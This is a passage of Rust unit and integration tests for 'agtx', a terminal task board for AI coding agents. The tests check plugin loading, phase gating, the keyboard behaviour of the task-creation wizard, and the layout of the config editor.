    std::fs::write(
        plugin_dir.join("plugin.toml"),
        r#"
        name = "test-plug"
        [commands]
        [prompts]
        [artifacts]
    "#,
    )
    .unwrap();

    let mut task = crate::db::Task::new("Test", "claude", "proj");
    task.plugin = Some("test-plug".to_string());
    let plugin = load_task_plugin(&task, Some(dir.path()), "claude");
    assert!(plugin.is_some());
    assert_eq!(plugin.unwrap().name, "test-plug");
}

#[test]
fn test_load_task_plugin_unsupported_agent_returns_none() {
    // Create a plugin that only supports claude
    let dir = tempfile::tempdir().unwrap();
    let plugin_dir = dir.path().join(".agtx").join("plugins").join("claude-only");
    std::fs::create_dir_all(&plugin_dir).unwrap();
    std::fs::write(
        plugin_dir.join("plugin.toml"),
        r#"
        name = "claude-only"
        supported_agents = ["claude"]
        [commands]
        [prompts]
        [artifacts]
    "#,
    )
    .unwrap();

    let mut task = crate::db::Task::new("Test", "gemini", "proj");
    task.plugin = Some("claude-only".to_string());
    let plugin = load_task_plugin(&task, Some(dir.path()), "gemini");
    assert!(plugin.is_none(), "should reject unsupported agent");
}

#[test]
fn test_load_task_plugin_nonexistent_returns_none() {
    let mut task = crate::db::Task::new("Test", "claude", "proj");
    task.plugin = Some("nonexistent-plugin-xyz".to_string());
    let plugin = load_task_plugin(&task, None, "claude");
    assert!(plugin.is_none());
}

#[test]
fn test_load_task_plugin_bundled_fallback() {
    // When a bundled plugin name is set but not on disk, falls back to bundled
    let mut task = crate::db::Task::new("Test", "claude", "proj");
    task.plugin = Some("agtx".to_string());
    // Pass a path where no .agtx/plugins/agtx/ exists
    let dir = tempfile::tempdir().unwrap();
    let plugin = load_task_plugin(&task, Some(dir.path()), "claude");
    assert!(plugin.is_some(), "should fall back to bundled agtx plugin");
    assert_eq!(plugin.unwrap().name, "agtx");
}

#[test]
fn test_phase_accepts_task_with_task_placeholder() {
    use crate::config::WorkflowPlugin;
    let plugin: WorkflowPlugin = toml::from_str(
        r#"
        name = "test"
        [commands]
        planning = "/test:plan {task}"
        [prompts]
        [artifacts]
    "#,
    )
    .unwrap();
    assert!(
        plugin.phase_accepts_task("planning"),
        "command with {{task}} should be accepted"
    );
}

#[test]
fn test_phase_accepts_task_without_task_placeholder() {
    use crate::config::WorkflowPlugin;
    let plugin: WorkflowPlugin = toml::from_str(
        r#"
        name = "test"
        [commands]
        planning = "/test:plan {phase}"
        [prompts]
        [artifacts]
    "#,
    )
    .unwrap();
    assert!(
        !plugin.phase_accepts_task("planning"),
        "command without {{task}} should be blocked"
    );
}

#[test]
fn test_phase_accepts_task_void_plugin_ungated() {
    use crate::config::WorkflowPlugin;
    // Void plugin: no commands, no prompts — should be ungated
    let plugin: WorkflowPlugin = toml::from_str(
        r#"
        name = "void"
        [commands]
        [prompts]
        [artifacts]
    "#,
    )
    .unwrap();
    assert!(
        plugin.phase_accepts_task("planning"),
        "void plugin should be ungated for planning"
    );
    assert!(
        plugin.phase_accepts_task("running"),
        "void plugin should be ungated for running"
    );
}

#[test]
fn test_phase_accepts_task_prompt_with_task() {
    use crate::config::WorkflowPlugin;
    let plugin: WorkflowPlugin = toml::from_str(
        r#"
        name = "test"
        [commands]
        [prompts]
        planning = "Task: {task}"
        [artifacts]
    "#,
    )
    .unwrap();
    assert!(
        plugin.phase_accepts_task("planning"),
        "prompt with {{task}} should be accepted"
    );
}

// === App Integration Tests ===

#[cfg(feature = "test-mocks")]
use crate::agent::MockAgentRegistry;

/// Helper: create an App wired with default (no-op) mocks for integration tests.
/// Returns App in project mode with an empty in-memory DB.
#[cfg(feature = "test-mocks")]
fn make_test_app() -> App {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    mock_tmux.expect_has_session().returning(|_| false);

    App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap()
}

/// The wizard's active text field — the title on the title step, the prompt on
/// the prompt step. Tests assert against whichever one they opened.
#[cfg(feature = "test-mocks")]
fn wiz(app: &App) -> &TextInput {
    app.state
        .wizard
        .as_ref()
        .expect("no wizard open")
        .active_input()
        .expect("the plugin step has no text field")
}

#[cfg(feature = "test-mocks")]
fn wiz_mut(app: &mut App) -> &mut TextInput {
    app.state
        .wizard
        .as_mut()
        .expect("no wizard open")
        .active_input_mut()
        .expect("the plugin step has no text field")
}

/// A wizard already filled in, for tests about `save_task` rather than about
/// the flow that reaches it.
#[cfg(feature = "test-mocks")]
fn filled_wizard(
    title: &str,
    prompt: &str,
    plugin: &str,
    editing: Option<&str>,
) -> crate::tui::wizard::WizardState {
    let mut wizard = match editing {
        Some(id) => crate::tui::wizard::WizardState::editing(id, title),
        None => {
            let mut w = crate::tui::wizard::WizardState::creating();
            w.title.set_text(title);
            w
        }
    };
    wizard.prompt.set_text(prompt);
    wizard.plugin.options = vec![PickOption::new(plugin, plugin, "", true)];
    wizard.plugin.selected = 0;
    wizard
}

/// Walk the wizard forward until it reaches `step`.
///
/// Which optional steps a flow includes depends on how many agents and plugins
/// are installed, so counting `Enter` presses is brittle — a test about the
/// prompt should not break because an agent step appeared before it.
#[cfg(feature = "test-mocks")]
fn advance_to(app: &mut App, step: WizardStep) {
    for _ in 0..6 {
        if app.state.wizard_step() == Some(step) {
            return;
        }
        press_key(app, KeyCode::Enter);
    }
    panic!(
        "wizard never reached {step:?}; stopped at {:?}",
        app.state.wizard_step()
    );
}

/// Open the wizard straight on its prompt step, for tests about the prompt
/// itself rather than about getting there.
#[cfg(feature = "test-mocks")]
fn open_prompt_step(app: &mut App) {
    let mut wizard = crate::tui::wizard::WizardState::creating();
    wizard.title.set_text("test task");
    wizard.advance();
    assert_eq!(wizard.step(), WizardStep::Prompt);
    app.state.wizard = Some(wizard);
}

/// Helper: simulate a key press on the App.
#[cfg(feature = "test-mocks")]
fn press_key(app: &mut App, code: KeyCode) {
    app.handle_key(crossterm::event::KeyEvent::new(
        code,
        crossterm::event::KeyModifiers::NONE,
    ))
    .unwrap();
}

/// Helper: simulate typing a string into the App (character by character).
#[cfg(feature = "test-mocks")]
fn type_str(app: &mut App, s: &str) {
    for c in s.chars() {
        press_key(app, KeyCode::Char(c));
    }
}

// --- Smoke tests ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_app_new_for_test_project_mode() {
    let app = make_test_app();
    assert_eq!(app.state.project_name, "test-project");
    assert!(app.state.db.is_some());
    assert!(app.state.project_path.is_some());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_app_new_for_test_dashboard_mode() {
    let app = App::new_for_test(
        None,
        Arc::new(MockTmuxOperations::new()),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();
    assert_eq!(app.state.project_name, "Dashboard");
    assert!(app.state.db.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_app_new_for_test_can_draw() {
    let mut app = make_test_app();
    assert!(app.draw().is_ok());
}

// --- Task creation flow ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_create_task_full_flow() {
    let mut app = make_test_app();

    // Start in Normal mode, board is empty
    assert_eq!(app.state.wizard_step(), None);
    assert!(app.state.board.tasks.is_empty());

    // Press 'o' to start task creation
    press_key(&mut app, KeyCode::Char('o'));
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));

    // Type a title
    type_str(&mut app, "Fix login bug");
    assert_eq!(wiz(&app).buffer, "Fix login bug");

    // Press Enter to move to description
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
    assert_eq!(
        app.state.wizard.as_ref().unwrap().title.as_str(),
        "Fix login bug",
        "the title is kept, not moved out into a side field"
    );
    assert!(wiz(&app).buffer.is_empty());

    // Type a description
    type_str(&mut app, "Users report 500 error on the login page");

    // Press Enter to save
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), None);

    // Task should now be in the board
    assert_eq!(app.state.board.tasks.len(), 1);
    let task = &app.state.board.tasks[0];
    assert_eq!(task.title, "Fix login bug");
    assert_eq!(
        task.description.as_deref(),
        Some("Users report 500 error on the login page")
    );
    assert_eq!(task.status, TaskStatus::Backlog);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_create_task_without_description() {
    let mut app = make_test_app();

    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Quick fix");
    press_key(&mut app, KeyCode::Enter); // to description
    press_key(&mut app, KeyCode::Enter); // save with empty description

    assert_eq!(app.state.board.tasks.len(), 1);
    let task = &app.state.board.tasks[0];
    assert_eq!(task.title, "Quick fix");
    assert!(task.description.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_create_task_cancel_with_esc() {
    let mut app = make_test_app();

    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Abandoned task");
    press_key(&mut app, KeyCode::Esc);

    assert_eq!(app.state.wizard_step(), None);
    assert!(app.state.board.tasks.is_empty());
}

// --- Board navigation ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_board_navigation_with_tasks() {
    let mut app = make_test_app();

    // Create two tasks
    let db = app.state.db.as_ref().unwrap();
    db.create_task(&Task::new("Task 1", "claude", "test-project"))
        .unwrap();
    db.create_task(&Task::new("Task 2", "claude", "test-project"))
        .unwrap();
    app.refresh_tasks().unwrap();
    assert_eq!(app.state.board.tasks.len(), 2);

    // Board starts at column 0 (Backlog), row 0
    assert_eq!(app.state.board.selected_column, 0);
    assert_eq!(app.state.board.selected_row, 0);

    // Press 'j' to move down
    press_key(&mut app, KeyCode::Char('j'));
    assert_eq!(app.state.board.selected_row, 1);

    // Press 'k' to move up
    press_key(&mut app, KeyCode::Char('k'));
    assert_eq!(app.state.board.selected_row, 0);

    // Press 'l' to move to next column (Planning — empty, but cursor moves)
    press_key(&mut app, KeyCode::Char('l'));
    assert_eq!(app.state.board.selected_column, 1);

    // Press 'h' to move back
    press_key(&mut app, KeyCode::Char('h'));
    assert_eq!(app.state.board.selected_column, 0);
}

// --- Delete task flow ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_delete_task_confirm() {
    let mut app = make_test_app();

    // Create a task
    let db = app.state.db.as_ref().unwrap();
    db.create_task(&Task::new("Delete me", "claude", "test-project"))
        .unwrap();
    app.refresh_tasks().unwrap();
    assert_eq!(app.state.board.tasks.len(), 1);

    // Press 'x' to delete — should show confirmation popup
    press_key(&mut app, KeyCode::Char('x'));
    assert!(app.state.delete_confirm_popup.is_some());

    // Press 'y' to confirm
    press_key(&mut app, KeyCode::Char('y'));
    assert!(app.state.delete_confirm_popup.is_none());
    assert!(app.state.board.tasks.is_empty());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_delete_task_cancel() {
    let mut app = make_test_app();

    let db = app.state.db.as_ref().unwrap();
    db.create_task(&Task::new("Keep me", "claude", "test-project"))
        .unwrap();
    app.refresh_tasks().unwrap();

    press_key(&mut app, KeyCode::Char('x'));
    assert!(app.state.delete_confirm_popup.is_some());

    // Press Esc to cancel
    press_key(&mut app, KeyCode::Esc);
    assert!(app.state.delete_confirm_popup.is_none());
    assert_eq!(app.state.board.tasks.len(), 1);
}

// --- Quit ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_quit_sets_should_quit() {
    let mut app = make_test_app();
    assert!(!app.state.should_quit);
    press_key(&mut app, KeyCode::Char('q'));
    assert!(app.state.should_quit);
}

#[test]
fn test_merge_conflicts_skill_name_to_command() {
    assert_eq!(
        skills::skill_name_to_command("agtx-merge-conflicts"),
        "agtx:merge-conflicts"
    );
}

#[test]
fn test_merge_conflicts_transform_plugin_command() {
    assert_eq!(
        skills::transform_plugin_command("/agtx:merge-conflicts", "claude"),
        Some("/agtx:merge-conflicts".to_string())
    );
    assert_eq!(
        skills::transform_plugin_command("/agtx:merge-conflicts", "gemini"),
        Some("/agtx:merge-conflicts".to_string())
    );
    assert_eq!(
        skills::transform_plugin_command("/agtx:merge-conflicts", "opencode"),
        Some("/agtx-merge-conflicts".to_string())
    );
    assert_eq!(
        skills::transform_plugin_command("/agtx:merge-conflicts", "codex"),
        Some("$agtx-merge-conflicts".to_string())
    );
    assert_eq!(
        skills::transform_plugin_command("/agtx:merge-conflicts", "copilot"),
        None
    );
}

#[test]
fn test_merge_conflicts_skill_registered() {
    // Verify the merge-conflicts skill is in BUILTIN_SKILLS
    assert!(
        skills::BUILTIN_SKILLS
            .iter()
            .any(|(name, _)| *name == "agtx-merge-conflicts"),
        "agtx-merge-conflicts should be registered in BUILTIN_SKILLS"
    );
}

// --- Wizard: Agent & Plugin Selection ---

/// Helper: create a test app with multiple agents available.
#[cfg(feature = "test-mocks")]
fn make_test_app_with_agents() -> App {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    mock_tmux.expect_has_session().returning(|_| false);

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    // Inject 2 agents so wizard doesn't auto-skip
    app.state.available_agents = vec![
        crate::agent::Agent::new(
            "claude",
            "claude",
            "Anthropic Claude",
            "Claude <noreply@anthropic.com>",
        ),
        crate::agent::Agent::new(
            "codex",
            "codex",
            "OpenAI Codex",
            "Codex <noreply@openai.com>",
        ),
    ];
    app
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_merge_conflict_checked_guard() {
    let mut app = make_test_app();
    let task_id = "test-task-123".to_string();

    // Initially not checked
    assert!(!app.state.merge_conflict_checked.contains(&task_id));

    // After inserting, should be guarded
    app.state.merge_conflict_checked.insert(task_id.clone());
    assert!(app.state.merge_conflict_checked.contains(&task_id));

    // Clear resets the guard
    app.state.merge_conflict_checked.clear();
    assert!(!app.state.merge_conflict_checked.contains(&task_id));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_wizard_plugin_selection() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Test task");
    advance_to(&mut app, WizardStep::Plugin);
    assert!(!app.state.wizard.as_ref().unwrap().plugin.options.is_empty());

    // Navigate down
    let initial = app.state.wizard.as_ref().unwrap().plugin.selected;
    press_key(&mut app, KeyCode::Char('j'));
    assert_eq!(
        app.state.wizard.as_ref().unwrap().plugin.selected,
        initial + 1
    );

    // Advance to description
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
}

/// The wizard's text fields share one editor, reached through each handler's
/// fallback arm. These pin the two places that ordering matters.
#[test]
#[cfg(feature = "test-mocks")]
fn alt_word_motion_in_the_title_field_moves_rather_than_typing() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "hello world");

    app.handle_key(key_event(KeyCode::Char('b'), KeyModifiers::ALT))
        .unwrap();
    assert_eq!(wiz(&app).cursor, 6);
    assert_eq!(
        wiz(&app).buffer,
        "hello world",
        "Alt+b must not insert a literal b"
    );

    app.handle_key(key_event(KeyCode::Char('f'), KeyModifiers::ALT))
        .unwrap();
    assert_eq!(wiz(&app).cursor, 11);
    assert_eq!(wiz(&app).buffer, "hello world");
}

/// The prompt field gives `#`, `/` and `!` their own meanings, so its editing
/// keys are reached through a fallback arm *below* those guards.
#[test]
#[cfg(feature = "test-mocks")]
fn editing_keys_in_the_prompt_field_survive_the_trigger_guards() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    advance_to(&mut app, WizardStep::Prompt);

    type_str(&mut app, "fix the thing");
    app.handle_key(key_event(KeyCode::Char('b'), KeyModifiers::ALT))
        .unwrap();
    assert_eq!(wiz(&app).cursor, 8, "Alt+b lands at the start of 'thing'");
    assert_eq!(wiz(&app).buffer, "fix the thing");

    app.handle_key(key_event(KeyCode::Backspace, KeyModifiers::ALT))
        .unwrap();
    assert_eq!(wiz(&app).buffer, "fix thing");

    press_key(&mut app, KeyCode::Home);
    assert_eq!(wiz(&app).cursor, 0);
    press_key(&mut app, KeyCode::End);
    assert_eq!(wiz(&app).cursor, 9);
    press_key(&mut app, KeyCode::Backspace);
    assert_eq!(wiz(&app).buffer, "fix thin");
}

/// The chords that need no negotiation from the terminal. `Shift+Enter` is not
/// among them: a bare CR is all a terminal sends for both it and Enter unless
/// the Kitty protocol is in play, so binding it would mostly read as "save".
#[test]
#[cfg(feature = "test-mocks")]
fn every_newline_chord_inserts_instead_of_saving() {
    for (code, modifiers) in [
        (KeyCode::Char('j'), KeyModifiers::CONTROL),
        (KeyCode::Enter, KeyModifiers::ALT),
    ] {
        let mut app = make_test_app_with_agents();
        press_key(&mut app, KeyCode::Char('o'));
        type_str(&mut app, "Title");
        advance_to(&mut app, WizardStep::Prompt);

        type_str(&mut app, "first");
        app.handle_key(key_event(code, modifiers)).unwrap();
        type_str(&mut app, "second");

        assert_eq!(
            wiz(&app).as_str(),
            "first\nsecond",
            "{code:?}+{modifiers:?} should have inserted a newline"
        );
        assert_eq!(
            app.state.wizard_step(),
            Some(WizardStep::Prompt),
            "{code:?}+{modifiers:?} must not submit"
        );
        assert!(app.state.board.tasks.is_empty());
    }
}

/// Enter saves. A `Shift+Enter` that the terminal could not distinguish arrives
/// here as exactly this, and saving is the honest outcome — the alternative is
/// a binding that silently does nothing on most terminals.
#[test]
#[cfg(feature = "test-mocks")]
fn a_bare_enter_in_the_prompt_saves() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    advance_to(&mut app, WizardStep::Prompt);
    type_str(&mut app, "body");

    press_key(&mut app, KeyCode::Enter);
    assert!(app.state.wizard.is_none());
    assert_eq!(app.state.board.tasks.len(), 1);
}

/// `Ctrl+J` moves the cursor while a picker is open; it only means "newline"
/// when nothing has claimed it first.
#[test]
#[cfg(feature = "test-mocks")]
fn ctrl_j_navigates_an_open_picker_rather_than_inserting() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    advance_to(&mut app, WizardStep::Prompt);

    type_str(&mut app, "see !");
    assert!(app.state.task_ref_search.is_some(), "the picker is open");
    let before = wiz(&app).as_str().to_string();

    app.handle_key(key_event(KeyCode::Char('j'), KeyModifiers::CONTROL))
        .unwrap();
    assert_eq!(
        wiz(&app).as_str(),
        before,
        "no newline, and no literal j, while the picker owns it"
    );
    assert!(app.state.task_ref_search.is_some(), "the picker stays open");
}

/// A chord no picker claims is not text. Before the guard, `Ctrl+X` in a picker
/// typed a literal "x" into both the pattern and the prompt.
#[test]
#[cfg(feature = "test-mocks")]
fn an_unclaimed_chord_is_not_typed_into_a_picker() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    advance_to(&mut app, WizardStep::Prompt);

    type_str(&mut app, "see !");
    let before = wiz(&app).as_str().to_string();

    for modifiers in [KeyModifiers::CONTROL, KeyModifiers::ALT] {
        app.handle_key(key_event(KeyCode::Char('x'), modifiers))
            .unwrap();
    }
    assert_eq!(wiz(&app).as_str(), before);
    assert_eq!(
        app.state.task_ref_search.as_ref().unwrap().pattern,
        "",
        "and nothing reached the search pattern either"
    );
}

/// The backslash escape is the documented way in and the one the footer names.
#[test]
#[cfg(feature = "test-mocks")]
fn a_trailing_backslash_makes_a_newline() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    advance_to(&mut app, WizardStep::Prompt);

    type_str(&mut app, "first\\");
    press_key(&mut app, KeyCode::Enter);
    type_str(&mut app, "second");

    assert_eq!(wiz(&app).as_str(), "first\nsecond");
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Prompt));
}

/// A terminal in Kitty mode — from the user's own shell or multiplexer, since
/// agtx does not ask for it — reports Shift+Tab as Tab with SHIFT rather than
/// as BackTab. Both spellings step back.
#[test]
#[cfg(feature = "test-mocks")]
fn shift_tab_reported_as_a_modified_tab_still_steps_back() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    advance_to(&mut app, WizardStep::Agent);

    app.handle_key(key_event(KeyCode::Tab, KeyModifiers::SHIFT))
        .unwrap();
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
}

// --- config editor geometry ---

/// A fixed percentage left everything huddled in the top-left of a mostly empty
/// box. These pin the two properties that fixed: it is sized to its content,
/// and it is centred.
#[test]
#[cfg(feature = "test-mocks")]
fn the_config_editor_is_centred_and_smaller_than_the_screen() {
    let _guard = redirect_config_dir();
    let dir = tempfile::tempdir().unwrap();
    let mut app = make_test_app_at(dir.path());
    app.open_config_editor();
    let editor = app.state.config_editor.as_ref().unwrap();

    let screen = Rect {
        x: 0,
        y: 0,
        width: 200,
        height: 60,
    };
    let popup = config_editor_area(editor, screen);

    assert!(
        popup.width < screen.width,
        "sized to content, not to screen"
    );
    assert!(popup.height < screen.height);
    // Centred: the margins on both sides agree to within the rounding of an
    // odd remainder.
    let left = popup.x - screen.x;
    let right = (screen.x + screen.width) - (popup.x + popup.width);
    assert!(left.abs_diff(right) <= 1, "left={left} right={right}");
    let top = popup.y - screen.y;
    let bottom = (screen.y + screen.height) - (popup.y + popup.height);
    assert!(top.abs_diff(bottom) <= 1, "top={top} bottom={bottom}");
}

/// Tall enough for the biggest section, so tabbing between them never resizes
/// the box under the cursor.
#[test]
#[cfg(feature = "test-mocks")]
fn the_config_editor_fits_its_largest_section() {
    let _guard = redirect_config_dir();
    let dir = tempfile::tempdir().unwrap();
    let mut app = make_test_app_at(dir.path());
    app.open_config_editor();
    let editor = app.state.config_editor.as_ref().unwrap();

    let screen = Rect {
        x: 0,
        y: 0,
        width: 200,
        height: 60,
    };
    let biggest = editor
        .sections
        .iter()
        .map(|s| s.fields.len())
        .max()
        .unwrap();
    // borders + tab strip + help/status + footer
    let chrome = 2 + 1 + 2 + 1;
    assert_eq!(
        config_editor_area(editor, screen).height as usize,
        biggest + chrome
    );

    // And the size does not depend on which section is selected.
    let first = config_editor_area(editor, screen);
    let mut app2 = make_test_app_at(dir.path());
    app2.open_config_editor();
    app2.state.config_editor.as_mut().unwrap().section = 2;
    let later = config_editor_area(app2.state.config_editor.as_ref().unwrap(), screen);
    assert_eq!(first, later, "the box must not move when tabbing");
}

/// A terminal too small for the content still gets a box that fits inside it.
#[test]
#[cfg(feature = "test-mocks")]
fn the_config_editor_is_clamped_to_a_small_terminal() {
    let _guard = redirect_config_dir();
    let dir = tempfile::tempdir().unwrap();
    let mut app = make_test_app_at(dir.path());
    app.open_config_editor();
    let editor = app.state.config_editor.as_ref().unwrap();

    let screen = Rect {
        x: 0,
        y: 0,
        width: 40,
        height: 12,
    };
    let popup = config_editor_area(editor, screen);
    assert!(popup.x + popup.width <= screen.x + screen.width);
    assert!(popup.y + popup.height <= screen.y + screen.height);
}

/// A `/` mid-word is not a skill trigger, so it has to fall past that guard and
/// arrive as ordinary text.
#[test]
#[cfg(feature = "test-mocks")]
fn a_slash_mid_word_is_typed_not_treated_as_a_trigger() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    advance_to(&mut app, WizardStep::Prompt);

    type_str(&mut app, "src/main.rs");
    assert_eq!(wiz(&app).buffer, "src/main.rs");
    assert!(app.state.skill_search.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn esc_cancels_from_any_step() {
    // One key that always means "get me out of here" beats one whose effect
    // depends on which step you happen to be on. Stepping back is Shift+Tab.
    for steps_in in 0..=1 {
        let mut app = make_test_app_with_agents();
        press_key(&mut app, KeyCode::Char('o'));
        type_str(&mut app, "Drop me");
        for _ in 0..steps_in {
            press_key(&mut app, KeyCode::Enter);
        }

        press_key(&mut app, KeyCode::Esc);
        assert!(
            app.state.wizard.is_none(),
            "Esc {steps_in} step(s) in should have closed the wizard"
        );
        assert!(app.state.board.tasks.is_empty(), "and saved nothing");
    }
}

/// Back-navigation is why the wizard holds every field at once: stepping back
/// has to find the earlier answers still intact.
#[test]
#[cfg(feature = "test-mocks")]
fn stepping_back_from_the_prompt_preserves_everything_typed() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Fix login");

    advance_to(&mut app, WizardStep::Agent);
    press_key(&mut app, KeyCode::Char('j')); // pick a non-default agent
    let agent = app.state.wizard.as_ref().unwrap().agent.selected;

    advance_to(&mut app, WizardStep::Plugin);
    press_key(&mut app, KeyCode::Char('j')); // and a non-default plugin
    let plugin = app.state.wizard.as_ref().unwrap().plugin.selected;

    advance_to(&mut app, WizardStep::Prompt);
    type_str(&mut app, "cookie expires early");

    // Walk all the way back to the first step.
    press_key(&mut app, KeyCode::BackTab);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Plugin));
    assert_eq!(
        app.state.wizard.as_ref().unwrap().plugin.selected,
        plugin,
        "re-entering a list step must not rebuild it and reset the pick"
    );

    press_key(&mut app, KeyCode::BackTab);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Agent));
    assert_eq!(app.state.wizard.as_ref().unwrap().agent.selected, agent);

    press_key(&mut app, KeyCode::BackTab);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
    assert_eq!(wiz(&app).as_str(), "Fix login");

    // Forward again, and everything is still where it was left.
    advance_to(&mut app, WizardStep::Prompt);
    assert_eq!(wiz(&app).as_str(), "cookie expires early");
    assert_eq!(app.state.wizard.as_ref().unwrap().agent.selected, agent);
    assert_eq!(app.state.wizard.as_ref().unwrap().plugin.selected, plugin);
}

/// Shift+Tab and Ctrl+B go back too, from any step, without the "cancel when
/// there is nowhere to go" fallback that Esc carries.
#[test]
#[cfg(feature = "test-mocks")]
fn shift_tab_and_ctrl_b_step_back() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Title");
    advance_to(&mut app, WizardStep::Agent);

    press_key(&mut app, KeyCode::BackTab);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));

    press_key(&mut app, KeyCode::Enter);
    app.handle_key(key_event(KeyCode::Char('b'), KeyModifiers::CONTROL))
        .unwrap();
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));

    // ...and neither of them cancels from the first step.
    press_key(&mut app, KeyCode::BackTab);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
    assert!(app.state.wizard.is_some());
}

/// Saving from step one is the whole point of `Ctrl+S`: a title fix caught
/// early should not require walking the rest of the flow again.
#[test]
#[cfg(feature = "test-mocks")]
fn ctrl_s_saves_from_the_title_step() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Saved early");

    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
        .unwrap();

    assert!(app.state.wizard.is_none(), "saving closes the wizard");
    assert_eq!(app.state.board.tasks.len(), 1);
    assert_eq!(app.state.board.tasks[0].title, "Saved early");
    assert_eq!(app.state.board.tasks[0].description, None);
}

#[test]
#[cfg(feature = "test-mocks")]
fn ctrl_s_saves_from_the_plugin_step() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "Saved mid-flow");
    advance_to(&mut app, WizardStep::Plugin);

    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
        .unwrap();

    assert!(app.state.wizard.is_none());
    assert_eq!(app.state.board.tasks.len(), 1);
    assert_eq!(app.state.board.tasks[0].title, "Saved mid-flow");
}

/// A silent refusal reads as a broken key rather than a rejected input.
#[test]
#[cfg(feature = "test-mocks")]
fn an_empty_title_is_refused_out_loud() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    press_key(&mut app, KeyCode::Enter);

    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
    assert!(
        app.state.wizard.as_ref().unwrap().validation.is_some(),
        "the refusal has to say something"
    );
    assert!(app.state.board.tasks.is_empty());

    // The complaint clears as soon as the user acts on it.
    type_str(&mut app, "T");
    assert!(app.state.wizard.as_ref().unwrap().validation.is_none());
}

/// A whitespace-only title is not a title, and `Ctrl+S` from a later step has
/// to send the user back to where the problem actually is.
#[test]
#[cfg(feature = "test-mocks")]
fn saving_without_a_title_returns_to_the_title_step() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "x");
    advance_to(&mut app, WizardStep::Plugin);

    // Go back to the title, however many steps that is, and blank it out.
    while app.state.wizard_step() != Some(WizardStep::Title) {
        press_key(&mut app, KeyCode::BackTab);
    }
    press_key(&mut app, KeyCode::Backspace);
    press_key(&mut app, KeyCode::Enter);
    assert_eq!(app.state.wizard_step(), Some(WizardStep::Title));
    assert!(app.state.wizard.as_ref().unwrap().validation.is_some());
    assert!(app.state.board.tasks.is_empty());
}

#[test]
#[cfg(feature = "test-mocks")]
fn a_padded_title_is_trimmed_on_save() {
    let mut app = make_test_app_with_agents();
    press_key(&mut app, KeyCode::Char('o'));
    type_str(&mut app, "  Padded  ");
    app.handle_key(key_event(KeyCode::Char('s'), KeyModifiers::CONTROL))
        .unwrap();
    assert_eq!(app.state.board.tasks[0].title, "Padded");
}

/// A dropdown owns Esc while it is open. Since Esc otherwise cancels the
/// wizard, getting this wrong throws away the whole task — closing a picker
/// must only close the picker.
#[test]
#[cfg(feature = "test-mocks")]
